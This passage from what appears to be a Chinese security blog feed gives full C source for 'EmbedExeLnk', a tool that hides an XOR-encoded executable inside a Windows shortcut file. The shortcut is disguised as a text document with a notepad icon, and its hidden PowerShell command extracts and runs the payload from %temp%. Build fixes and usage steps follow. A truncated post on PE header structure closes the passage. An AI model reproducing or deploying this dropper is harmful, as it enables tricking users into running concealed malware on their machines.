class="type">wchar_t</span> *pCmdLinePtr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">wchar_t</span> wszOverwriteSkipBytesValue[<span class="number">16</span>];</span><br><span class="line"><span class="type">wchar_t</span> wszOverwriteSearchLnkFileSizeValue[<span class="number">16</span>];</span><br><span class="line">BYTE bXorEncryptValue = <span class="number">0</span>;</span><br><span class="line">DWORD dwTotalFileSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set xor encrypt value</span></span><br><span class="line">bXorEncryptValue = <span class="number">0x77</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create link file</span></span><br><span class="line">hLinkFile = CreateFile(pOutputLinkPath, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hLinkFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to create output file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialise link header</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="type">void</span> *)&amp;ShellLinkHeader, <span class="number">0</span>, <span class="keyword">sizeof</span>(ShellLinkHeader));</span><br><span class="line">ShellLinkHeader.dwHeaderSize = <span class="keyword">sizeof</span>(ShellLinkHeader);</span><br><span class="line">CLSIDFromString(<span class="string">L&quot;&#123;00021401-0000-0000-C000-000000000046&#125;&quot;</span>, &amp;ShellLinkHeader.LinkCLSID);</span><br><span class="line">ShellLinkHeader.dwLinkFlags = HasArguments | HasExpString | PreferEnvironmentPath | IsUnicode | HasName | HasIconLocation;</span><br><span class="line">ShellLinkHeader.dwFileAttributes = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.CreationTime.dwHighDateTime = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.CreationTime.dwLowDateTime = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.AccessTime.dwHighDateTime = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.AccessTime.dwLowDateTime = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.WriteTime.dwHighDateTime = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.WriteTime.dwLowDateTime = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.dwFileSize = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.dwIconIndex = <span class="number">0</span>;</span><br><span class="line">ShellLinkHeader.dwShowCommand = SW_SHOWMINNOACTIVE;</span><br><span class="line">ShellLinkHeader.wHotKey = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write ShellLinkHeader</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)&amp;ShellLinkHeader, <span class="keyword">sizeof</span>(ShellLinkHeader), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set link description</span></span><br><span class="line"><span class="built_in">memset</span>(wszLinkDescription, <span class="number">0</span>, <span class="keyword">sizeof</span>(wszLinkDescription));</span><br><span class="line">mbstowcs(wszLinkDescription, pLinkDescription, (<span class="keyword">sizeof</span>(wszLinkDescription) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>)) - <span class="number">1</span>);</span><br><span class="line">wLinkDescriptionLength = (WORD)wcslen(wszLinkDescription);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write LinkDescriptionLength</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)&amp;wLinkDescriptionLength, <span class="keyword">sizeof</span>(WORD), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write LinkDescription</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)wszLinkDescription, wLinkDescriptionLength * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set target command-line</span></span><br><span class="line"><span class="built_in">memset</span>(wszCommandLineArguments, <span class="number">0</span>, <span class="keyword">sizeof</span>(wszCommandLineArguments));</span><br><span class="line">_snwprintf(wszCommandLineArguments, (<span class="keyword">sizeof</span>(wszCommandLineArguments) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>)) - <span class="number">1</span>, <span class="string">L&quot;%512S/c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object &#123;$_.length -eq 0x00000000&#125; ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x%02X &#125;; $path = &#x27;%%temp%%\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^&amp; $path;&quot;</span>, <span class="string">&quot;&quot;</span>, bXorEncryptValue);</span><br><span class="line">wCommandLineArgumentsLength = (WORD)wcslen(wszCommandLineArguments);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write CommandLineArgumentsLength</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)&amp;wCommandLineArgumentsLength, <span class="keyword">sizeof</span>(WORD), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// store start of command-line arguments position</span></span><br><span class="line">dwCommandLineArgsStartPosition = GetFileSize(hLinkFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write CommandLineArguments</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)wszCommandLineArguments, wCommandLineArgumentsLength * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set link icon path</span></span><br><span class="line"><span class="built_in">memset</span>(wszIconLocation, <span class="number">0</span>, <span class="keyword">sizeof</span>(wszIconLocation));</span><br><span class="line">mbstowcs(wszIconLocation, pLinkIconPath, (<span class="keyword">sizeof</span>(wszIconLocation) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>)) - <span class="number">1</span>);</span><br><span class="line">wIconLocationLength = (WORD)wcslen(wszIconLocation);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write IconLocationLength</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)&amp;wIconLocationLength, <span class="keyword">sizeof</span>(WORD), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write IconLocation</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)wszIconLocation, wIconLocationLength * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialise environment variable data block</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="type">void</span> *)&amp;EnvironmentVariableDataBlock, <span class="number">0</span>, <span class="keyword">sizeof</span>(EnvironmentVariableDataBlock));</span><br><span class="line">EnvironmentVariableDataBlock.dwBlockSize = <span class="keyword">sizeof</span>(EnvironmentVariableDataBlock);</span><br><span class="line">EnvironmentVariableDataBlock.dwBlockSignature = <span class="number">0xA0000001</span>;</span><br><span class="line"><span class="built_in">strncpy</span>(EnvironmentVariableDataBlock.szTargetAnsi, <span class="string">&quot;%windir%\\system32\\cmd.exe&quot;</span>, <span class="keyword">sizeof</span>(EnvironmentVariableDataBlock.szTargetAnsi) - <span class="number">1</span>);</span><br><span class="line">mbstowcs(EnvironmentVariableDataBlock.wszTargetUnicode, EnvironmentVariableDataBlock.szTargetAnsi, (<span class="keyword">sizeof</span>(EnvironmentVariableDataBlock.wszTargetUnicode) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>)) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write EnvironmentVariableDataBlock</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)&amp;EnvironmentVariableDataBlock, <span class="keyword">sizeof</span>(EnvironmentVariableDataBlock), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// store end of link data position</span></span><br><span class="line">dwEndOfLinkPosition = GetFileSize(hLinkFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// open target exe file</span></span><br><span class="line">hExeFile = CreateFile(pExePath, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hExeFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open exe file\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// append exe file to the end of the lnk file</span></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// read data from exe file</span></span><br><span class="line"><span class="keyword">if</span> (ReadFile(hExeFile, bExeDataBuffer, <span class="keyword">sizeof</span>(bExeDataBuffer), &amp;dwBytesRead, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hExeFile);</span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check for end of file</span></span><br><span class="line"><span class="keyword">if</span> (dwBytesRead == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;encrypt&quot; the exe file data</span></span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwBytesRead; i++)</span><br><span class="line">&#123;</span><br><span class="line">bExeDataBuffer[i] ^= bXorEncryptValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write data to lnk file</span></span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, bExeDataBuffer, dwBytesRead, &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hExeFile);</span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// close exe file handle</span></span><br><span class="line">CloseHandle(hExeFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">// store total file size</span></span><br><span class="line">dwTotalFileSize = GetFileSize(hLinkFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// find the offset value of the number of bytes to skip in the command-line arguments</span></span><br><span class="line">pCmdLinePtr = wcsstr(wszCommandLineArguments, <span class="string">L&quot;select -Skip 000000)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pCmdLinePtr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pCmdLinePtr += <span class="built_in">strlen</span>(<span class="string">&quot;select -Skip &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// move the file pointer back to the &quot;000000&quot; value in the command-line arguments</span></span><br><span class="line"><span class="keyword">if</span> (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE *)pCmdLinePtr - (BYTE *)wszCommandLineArguments), <span class="literal">NULL</span>, FILE_BEGIN) == INVALID_SET_FILE_POINTER)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// overwrite link file size</span></span><br><span class="line"><span class="built_in">memset</span>(wszOverwriteSkipBytesValue, <span class="number">0</span>, <span class="keyword">sizeof</span>(wszOverwriteSkipBytesValue));</span><br><span class="line">_snwprintf(wszOverwriteSkipBytesValue, (<span class="keyword">sizeof</span>(wszOverwriteSkipBytesValue) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>)) - <span class="number">1</span>, <span class="string">L&quot;%06u&quot;</span>, dwEndOfLinkPosition);</span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)wszOverwriteSkipBytesValue, wcslen(wszOverwriteSkipBytesValue) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// find the offset value of the total lnk file length in the command-line arguments</span></span><br><span class="line">pCmdLinePtr = wcsstr(wszCommandLineArguments, <span class="string">L&quot;_.length -eq 0x00000000&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pCmdLinePtr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pCmdLinePtr += <span class="built_in">strlen</span>(<span class="string">&quot;_.length -eq &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// move the file pointer back to the &quot;0x00000000&quot; value in the command-line arguments</span></span><br><span class="line"><span class="keyword">if</span> (SetFilePointer(hLinkFile, dwCommandLineArgsStartPosition + (DWORD)((BYTE *)pCmdLinePtr - (BYTE *)wszCommandLineArguments), <span class="literal">NULL</span>, FILE_BEGIN) == INVALID_SET_FILE_POINTER)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// overwrite link file size</span></span><br><span class="line"><span class="built_in">memset</span>(wszOverwriteSearchLnkFileSizeValue, <span class="number">0</span>, <span class="keyword">sizeof</span>(wszOverwriteSearchLnkFileSizeValue));</span><br><span class="line">_snwprintf(wszOverwriteSearchLnkFileSizeValue, (<span class="keyword">sizeof</span>(wszOverwriteSearchLnkFileSizeValue) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>)) - <span class="number">1</span>, <span class="string">L&quot;0x%08X&quot;</span>, dwTotalFileSize);</span><br><span class="line"><span class="keyword">if</span> (WriteFile(hLinkFile, (<span class="type">void</span> *)wszOverwriteSearchLnkFileSizeValue, wcslen(wszOverwriteSearchLnkFileSizeValue) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>), &amp;dwBytesWritten, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// close output file handle</span></span><br><span class="line">CloseHandle(hLinkFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *pExePath = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span> *pOutputLinkPath = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;EmbedExeLnk - www.x86matthew.com\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [exe_path] [output_lnk_path]\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get params</span></span><br><span class="line">pExePath = argv[<span class="number">1</span>];</span><br><span class="line">pOutputLinkPath = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a link file containing the target exe</span></span><br><span class="line"><span class="keyword">if</span> (CreateLinkFile(pExePath, pOutputLinkPath, <span class="string">&quot;%windir%\\system32\\notepad.exe&quot;</span>, <span class="string">&quot;Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finished\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h3><p>项目-&gt;属性-&gt;高级-&gt;字符集改为<code>未设置</code></p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLEDJ.png" alt="image-20230725230540498"></p><p>项目-&gt;属性-&gt;C/C++-&gt;语言-&gt;符合模式改为<code>否</code></p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLeER.png" alt="image-20230725225625545"></p><p>项目-&gt;属性-&gt;C/C++-&gt;语言-&gt;预处理器-&gt;预处理器定义-&gt;编辑-&gt;新增一行：<code>_CRT_SECURE_NO_WARNINGS</code></p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLVb9.png" alt="image-20230725230332316"></p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLAu4.png" alt="image-20230725230441535"></p><h3 id="生成lnk文件"><a href="#生成lnk文件" class="headerlink" title="生成lnk文件"></a>生成lnk文件</h3><p>在工程文件目录的Debug文件夹找到生成的exe文件</p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLFvF.png" alt="image-20230725230758678"></p><p>Win + R，输入<code>%temp%</code>打开存放临时文件的目录</p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLmU1.png" alt="image-20230725231502181"></p><p>点击修改日期，将文件改为以创建时间排序，方便观察效果</p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLn4x.png" alt="image-20230725231522880"></p><p>打开cmd，定位到生成的exe文件目录，输入指令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编译生成的文件名.exe [需要捆绑的<span class="type">exe</span>文件地址] [<span class="type">lnk</span>文件名]</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/07/25/pCXLM8K.png" alt="image-20230725232113455"></p><p>在exe目录下生成lnk文件，双击lnk文件，捆绑的exe文件执行成功并且以随机数命名保存在了%temp%目录下</p><p><img src="https://s1.ax1x.com/2023/07/25/pCXLKC6.png" alt="image-20230725231554077"></p>]]></content>
      
      
      <categories>
          
          <category> 捆绑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 捆绑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE结构简述</title>
      <link href="/post/15941cfe.html"/>
      <url>/post/15941cfe.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://fishc.com.cn/forum.php?mod=attachment&amp;aid=Mjg1OTZ8ZjEzMzUzNDN8MTY4OTk1MjEyMHwxMjU3ODAxfDUxMDQ3">LordPE下载</a></p><h2 id="MS-DOS头："><a href="#MS-DOS头：" class="headerlink" title="MS-DOS头："></a>MS-DOS头：</h2><p>兼容性，在DOS系统下提示无法运行</p><p><img src="https://s1.ax1x.com/2023/07/24/pCLqd6H.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接在VS里面输_IMAGE_DOS_HEADER然后CTRL点击即可看到结构定义，19个字段，重点关注第一个和最后一个</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// MS-DOS头的标志MZ，固定为4D 5A，实际值为0x5A4D</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// 文件末页的字节数</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// 文件页数</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// 重定位</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// 区段中头部的大小</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// 最小附加内存段的需求</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// 最大附加内存段的需求</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// 初始SS值，用于初始化堆栈</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// 初始SP值，用于初始化堆栈指针的值</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// 校验和</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// 初始化IP寄存器的值，即程序的入口点</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// 初始化CS的值，CS:IP</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// 重定位表的偏移</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM厂商的标识</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM厂商的信息</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// 4个字节，偏移为37，指向新的PE头，因为这是DOS头，是为了兼容DOS系统，真正执行需要到PE头</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>编辑器：低地址存放低位数据，<strong>小端</strong>存储</p><p>注意编辑器行号的进制要变为<strong>16进制</strong>而不是十进制，偏移是<strong>十六进制</strong>的数据呀！</p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><p>看清程序是32/64位</p><p><img src="https://s1.ax1x.com/2023/07/24/pCLqUpD.png" alt=""></p><p>标准PE头(每个PE文件都有)和扩展PE头(可有可无)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 32位</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">// PE标识：PE-&gt;50 45 00 00，实际值为0x00004550</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;<span class="comment">// 标准NT头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">// 扩展头，可选</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 64位</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">    DWORD Signature;<span class="comment">// PE标识：PE-&gt;50 45 00 00，实际值为0x00004550</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;<span class="comment">// 标准NT头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;<span class="comment">// 可选</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 标准NT头</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;<span class="comment">// 运行平台，指明可运行的处理器平台</span></span><br><span class="line">    WORD    NumberOfSections;<span class="comment">// 区段数量，.text、.rdata、.data...可用于遍历区段</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// 文件创建时间戳</span></span><br><span class="line">    DWORD   PointerToSymbolTable;<span class="comment">// 指向符号表的指针，没什么用了</span></span><br><span class="line">    DWORD   NumberOfSymbols;<span class="comment">// 符号表中符号的数量</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;<span class="comment">// 扩展头的大小</span></span><br><span class="line">    WORD    Characteristics;<span class="comment">// PE文件的属性，exe：0x010F，dll：0x0210</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span 